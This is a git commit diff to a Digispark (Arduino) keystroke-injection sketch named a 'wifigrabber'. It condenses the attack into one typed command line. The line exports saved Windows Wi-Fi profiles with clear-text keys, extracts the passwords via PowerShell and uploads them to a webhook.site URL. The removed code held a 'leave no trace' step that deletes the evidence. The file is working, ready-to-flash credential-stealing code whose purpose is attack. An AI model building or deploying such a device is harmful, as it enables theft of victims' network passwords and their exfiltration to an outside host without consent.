e17af05d2fb39ce60d2abac500b81be18806b9f5
noonessenpa1 <64846539+noonessenpa1@users.noreply.github.com>
2022-03-05 14:19:40 +0100

    Made it a one liner!
    Changes:
    -Made it an one liner, speeding the attack  and making it take less space.
    -Made the LED markings only at end, and used by default.

--- wifigrabber_digispark_notrace.ino
+++ wifigrabber_digispark_notrace.ino
@@ -1,10 +1,8 @@
-/*rubberducky code translated to work on digispark by noonessenpa1 
-from plug in to no traces 00:00:15.006
+/*rubberducky code translated to work on digispark by noonessenpa1  
+made to an one liner
 original code https://github.com/krankenpanzer wifi pass graber
-uncomment some lines for led markings
-2 quick blinks - code started
-3 slow blinks - code ended (safe to eject)
-!!! remember to change website !!!
+
+LED marking on the end - one blink to signal that it's finished.
 */
 
 
@@ -16,77 +14,28 @@ void setup() {
 
 void loop() {
   
-  /*LED effects/markings
-  digitalWrite(0, HIGH);   
-  digitalWrite(1, HIGH);
-  delay(100);
-  digitalWrite(0, LOW);    
-  digitalWrite(1, LOW);
-  delay(100);
-  digitalWrite(0, HIGH);   
-  digitalWrite(1, HIGH);
-  delay(100);
-  digitalWrite(0, LOW);    
-  digitalWrite(1, LOW);
-  */
-
-
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(50);
 
-
   DigiKeyboard.print("cmd /k");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.print("cd Temp");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.print("netsh wlan export profile key=clear");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-PASS");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/URL -Method POST -InFile WiFi-PASS"); //change website  
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(1000);
 
-  //leave no trace
-  DigiKeyboard.print("del WiFi* /s /f /q");
+  DigiKeyboard.print("netsh wlan export profile key=clear && powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-PASS && powershell Invoke-WebRequest -Uri https://webhook.site/URL -Method POST -InFile WiFi-PASS");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-
-  //end
+  DigiKeyboard.delay(1000);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  
+  //LED Markings
+  digitalWrite(0, HIGH);   
+  digitalWrite(1, HIGH);
+  delay(1000);
+  digitalWrite(0, LOW);    
+  digitalWrite(1, LOW);
 
-  /*LED effects/markings
-  digitalWrite(0, HIGH);   
-  digitalWrite(1, HIGH);
-  delay(1000);
-  digitalWrite(0, LOW);    
-  digitalWrite(1, LOW);
-  delay(1000);
-  digitalWrite(0, HIGH);   
-  digitalWrite(1, HIGH);
-  delay(1000);
-  digitalWrite(0, LOW);    
-  digitalWrite(1, LOW);
-  delay(1000);
-  digitalWrite(0, HIGH);   
-  digitalWrite(1, HIGH);
-  delay(1000);
-  digitalWrite(0, LOW);    
-  digitalWrite(1, LOW);
-  delay(1000);
-  */
-  
-  
-  
-  
   for (;;) {
     //no looping!
   }
